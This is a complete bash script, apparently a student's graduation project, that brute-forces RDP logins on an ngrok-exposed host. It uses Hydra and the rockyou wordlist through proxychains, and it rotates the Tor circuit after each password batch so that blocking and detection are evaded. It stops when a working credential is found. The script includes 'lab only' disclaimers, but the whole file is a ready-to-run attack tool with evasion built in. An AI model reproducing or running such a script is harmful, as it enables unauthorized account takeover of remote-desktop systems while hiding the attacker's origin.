#!/bin/bash
# ========================================================
# ADVANCED RDP BRUTE-FORCE SCRIPT WITH TOR ROTATION AND MENU (UPDATED)
# Author: Hoang - Đồ án tốt nghiệp An ninh Mạng
# Description: Minh họa brute-force RDP qua Ngrok sử dụng Hydra,
# với xoay circuit Tor để tránh phát hiện. Chỉ dùng trong lab!
# Update: Menu 2 options, batch processing with IP rotation after each attempt.
# ========================================================

# Cấu hình chính
TARGET="0.tcp.ap.ngrok.io"
PORT="18419"
USER="admin"
WORDLIST="/usr/share/wordlists/rockyou.txt"
TOR_CONTROL_PORT="9051"
TOR_DELAY=8

# Màu sắc
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Banner
display_banner() {
    echo -e "${BLUE}"
    cat << "EOF"
   _ _ _ _ ____ ____ ____ 
  | | | |_ _ __| | __ _| |_ __ _ | _ \| _ \| _ \ 
  | |_| | | | |/ _` |/ _` | __/ _` | | |_) | | | | |_) |
  | _ | |_| | (_| | (_| | || (_| | | _ <| |_| | _ <
  |_| |_|\__,_|\__,_|\__,_|\__\__,_| |_| \_\____/|_| \_\
EOF
    echo -e "${NC}"
    echo -e "${YELLOW} Advanced RDP Brute-Force with Tor Rotation & Menu${NC}"
    echo -e "${GREEN} Đồ án tốt nghiệp - An ninh mạng (Lab only!)${NC}"
    echo ""
}

# Kiểm tra công cụ và Tor
check_tools() {
    if ! command -v proxychains &> /dev/null; then
        echo -e "${RED}[!] proxychains chưa được cài đặt.${NC}"
        exit 1
    fi
    if ! command -v nc &> /dev/null; then
        echo -e "${RED}[!] netcat (nc) chưa được cài đặt.${NC}"
        exit 1
    fi
    if ! command -v hydra &> /dev/null; then
        echo -e "${RED}[!] hydra chưa được cài đặt.${NC}"
        exit 1
    fi
    if [[ ! -f "$WORDLIST" ]]; then
        echo -e "${RED}[!] Wordlist '$WORDLIST' không tồn tại.${NC}"
        exit 1
    fi

    # Kiểm tra kết nối Tor
    echo -e "${BLUE}[*] Kiểm tra kết nối Tor...${NC}"
    CURRENT_IP=$(proxychains -q curl -s --connect-timeout 5 https://api.ipify.org)
    if [[ -z "$CURRENT_IP" ]]; then
        echo -e "${RED}[!] Không thể kết nối qua Tor. Vui lòng kiểm tra dịch vụ Tor.${NC}"
        echo -e "${YELLOW} Gợi ý: sudo service tor start${NC}"
    else
        echo -e "${GREEN}[+] Kết nối Tor OK. IP ẩn danh hiện tại: $CURRENT_IP${NC}"
    fi
}

# Xoay Tor
rotate_tor() {
    echo -e "${YELLOW}[*] Đang xoay circuit Tor (NEWNYM)...${NC}"
    echo -e 'AUTHENTICATE ""\nsignal NEWNYM\nQUIT' | nc localhost $TOR_CONTROL_PORT > /dev/null 2>&1
    if [ $? -ne 0 ]; then
        echo -e "${RED}[!] Lỗi xoay Tor. Tiếp tục với circuit hiện tại.${NC}"
    else
        echo -e "${GREEN}[+] Circuit Tor mới đã được tạo.${NC}"
    fi
    echo -e "${YELLOW}[*] Chờ $TOR_DELAY giây để ổn định...${NC}"
    sleep $TOR_DELAY
}

# SỬA LẠI HÀM NÀY ĐỂ KHI CHẠY KHÔNG BỊ MÀN HÌNH ĐEN
run_brute() {
    local batch_size=$1
    local temp_list="temp_wordlist.txt"
    local batch_file="temp_batch.txt"
    local output_file="hydra_output.txt"

    # Copy file gốc ra file tạm nếu chưa có
    if [[ ! -f "$temp_list" ]]; then
        echo -e "${BLUE}[*] Đang khởi tạo danh sách mật khẩu tạm thời...${NC}"
        cp "$WORDLIST" "$temp_list"
    fi

    # Kiểm tra số lượng dòng còn lại
    local remaining=$(wc -l < "$temp_list")
    echo -e "${YELLOW}[INFO] Còn lại $remaining mật khẩu trong hàng đợi.${NC}"

    if [ "$remaining" -eq 0 ]; then
        echo -e "${RED}[!] Đã hết password để thử!${NC}"
        return 1
    fi

    if [ $remaining -lt $batch_size ]; then
        batch_size=$remaining
        echo -e "${YELLOW}[*] Số lượng còn lại ít hơn batch size. Điều chỉnh xuống: $batch_size${NC}"
    fi

    # Cắt batch_size dòng đầu tiên ra để thử
    head -n $batch_size "$temp_list" > "$batch_file"

    echo -e "${BLUE}[>>] Đang tấn công batch này với $batch_size passwords...${NC}"
    
    # --- PHẦN QUAN TRỌNG NHẤT: Sửa lỗi hiển thị ---
    # Sử dụng 'tee' để vừa hiện ra màn hình cho Hội đồng xem, vừa lưu vào file để grep
    # Bỏ -f (exit on found) ở đây để script tự xử lý logic, hoặc giữ lại tùy ý. 
    # Mình thêm -I để bỏ qua prompt chờ đợi
    proxychains hydra -l "$USER" -P "$batch_file" -s "$PORT" "$TARGET" rdp -t 4 -V -I -W 5 | tee "$output_file"

    # Kiểm tra kết quả
    if grep -q "login:" "$output_file" || grep -q "password:" "$output_file"; then
        echo -e "${GREEN}#######################################################${NC}"
        echo -e "${GREEN}# [SUCCESS] TÌM THẤY MẬT KHẨU!                        #${NC}"
        echo -e "${GREEN}#######################################################${NC}"
        grep "login:" "$output_file" --color=always
        success=0 # Mã 0 là thành công trong bash
    else
        success=1 # Mã 1 là thất bại
        echo -e "${YELLOW}[*] Batch này không chứa mật khẩu đúng. Chuẩn bị đổi IP...${NC}"
    fi

    # Loại bỏ các password đã thử khỏi danh sách tạm (Cập nhật lại danh sách)
    # Dùng sed để xóa dòng nhanh hơn tạo file temp mới
    sed -i "1,${batch_size}d" "$temp_list"

    # Dọn dẹp file rác nhỏ
    rm "$batch_file" "$output_file" 2>/dev/null

    return $success
}

# ... Phần Main Menu ...
main_menu() {
    check_tools
    TOTAL_LINES=$(wc -l < "$WORDLIST")
    echo -e "${YELLOW}[*] Wordlist: $WORDLIST ($TOTAL_LINES passwords tổng)${NC}"

    while true; do
        display_banner
        echo -e "${GREEN}Menu Options:${NC}"
        echo "1) Tấn công loop với xoay Tor"
        echo "2) Exit"
        read -p "Chọn option (1-2): " option

        case $option in
            1)
                read -p "Nhập tổng số lần tấn công: " max_attempts
                read -p "Nhập số passwords mỗi lần: " pass_per_attempt
                local attempt=1
                local found=0

                while [ $attempt -le $max_attempts ] && [ $found -eq 0 ]; do
                    echo -e "${YELLOW}[*] Lần tấn công $attempt/$max_attempts${NC}"
                    rotate_tor
                    run_brute $pass_per_attempt
                    if [ $? -eq 0 ]; then
                        echo -e "${GREEN}[+] Thành công ở lần $attempt! Dừng loop.${NC}"
                        found=1
                    else
                        echo -e "${RED}[-] Không thành công lần $attempt. Tiếp tục...${NC}"
                    fi
                    ((attempt++))
                done

                if [ $found -eq 0 ]; then
                    echo -e "${RED}[-] Hết $max_attempts lần, không thành công.${NC}"
                fi
                ;;
            2)
                rm temp_wordlist.txt 2>/dev/null
                echo -e "${GREEN}[*] Thoát script. Nhớ cleanup!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Option không hợp lệ.${NC}"
                ;;
        esac
        echo -e "${YELLOW}[*] Quay lại menu...${NC}"
        sleep 2
    done
}

main_menu

echo -e "${RED} Nhắc nhở: Chỉ sử dụng trong môi trường lab với sự cho phép hợp pháp. Không lạm dụng!${NC}"
